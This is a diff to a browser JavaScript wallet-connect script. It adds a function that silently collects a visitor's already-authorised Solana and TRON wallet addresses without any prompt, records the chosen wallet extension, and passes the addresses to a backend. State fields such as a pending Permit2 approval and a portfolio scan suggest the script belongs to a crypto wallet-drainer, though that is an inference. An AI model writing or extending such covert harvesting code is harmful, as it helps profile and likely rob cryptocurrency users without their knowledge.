@@ -1399,6 +1399,7 @@
     pendingEvmPermit2: null,
     wcSessionActive: false,
     connectMode: null,
+    injectedWalletKey: '',
     portfolioScan: null,
     notifySessionKey: null,
     connectSession: null,
@@ -2195,20 +2196,64 @@
     L.log('[connect] backend notified |', compact.join(' | ') || 'evm only');
   }
 
+  /** Harvest already-authorized non-EVM sessions without opening extension popups. */
+  function silentHarvestConnectedFamilies() {
+    try {
+      var svmList = (S.familyProviders && S.familyProviders.SVM) || [];
+      for (var si = 0; si < svmList.length; si++) {
+        var sp = svmList[si].provider;
+        if (!sp) continue;
+        var pk = sp.publicKey || (sp.account && sp.account.publicKey);
+        var solAddr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
+        if (solAddr) {
+          S.chains.SOL = { address: solAddr, name: svmList[si].hint || 'SVM' };
+          S.familyConnections.SVM = {
+            provider: sp,
+            address: solAddr,
+            name: 'SVM',
+            family: 'SVM',
+            hint: svmList[si].hint || 'extension',
+          };
+          break;
+        }
+      }
+    } catch (e) {}
+    try {
+      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        var tAddr = window.tronWeb.defaultAddress.base58;
+        S.chains.TRON = { address: tAddr, name: 'TronLink' };
+      }
+    } catch (e2) {}
+  }
+
   /** One connect: harvest WC session + extension families, send all addresses to backend. */
   async function linkAllFamiliesOnConnect(evmAddr) {
     discoverChainFamilies();
     applyLegionWalletSessionAddresses();
     wireWcFamilyConnections();
 
-    // Injected extension pick (MetaMask, Coinbase, …) = EVM only.
-    // Do NOT open Phantom/SOL or other extension popups in the same click.
-    // Multi-chain harvest runs on WalletConnect (phone approves namespaces).
+    // Browser extension pick (MetaMask, Trust, Coinbase, Rabby, …):
+    // Connect the picked EVM wallet only — do NOT auto-open Phantom/SOL popups.
+    // Still silently harvest SOL/TRON if already authorized in browser.
+    // Full multi-chain prompts stay on WalletConnect (phone approves all namespaces).
     if (S.connectMode === 'injected') {
+      silentHarvestConnectedFamilies();
+      applyLegionWalletSessionAddresses();
+      wireWcFamilyConnections();
       S.familiesLinked = true;
       S.allAddresses = collectAddressMap(evmAddr);
       saveWcFamilyContext(S.allAddresses);
-      L.log('[connect] linked families: evm:' + String(evmAddr).slice(0, 10) + '... (extension — EVM only)');
+      var extParts = [];
+      Object.keys(S.allAddresses).forEach(function (fk) {
+        if (S.allAddresses[fk]) extParts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
+      });
+      L.log(
+        '[connect] linked families:',
+        extParts.join(' | ') || ('evm:' + String(evmAddr).slice(0, 10) + '...'),
+        '| extension pick:',
+        S.injectedWalletKey || 'injected',
+        '(no cross-wallet popups)'
+      );
       return S.allAddresses;
     }
 
@@ -5319,6 +5364,9 @@
       return;
     }
     if (!(await prepInjectedMode())) return;
+    S.injectedWalletKey = String(
+      (choice.info && (choice.info.walletKey || choice.info.name)) || choice.walletKey || 'injected'
+    ).toLowerCase();
     UI._walletIcon = (choice.info && choice.info.icon) || '';
     if (!UI._overlayEl) UI.overlay.show('connecting', { walletIcon: UI._walletIcon });
     if (choice.provider) await handleEvmConnect(choice.provider, choice);
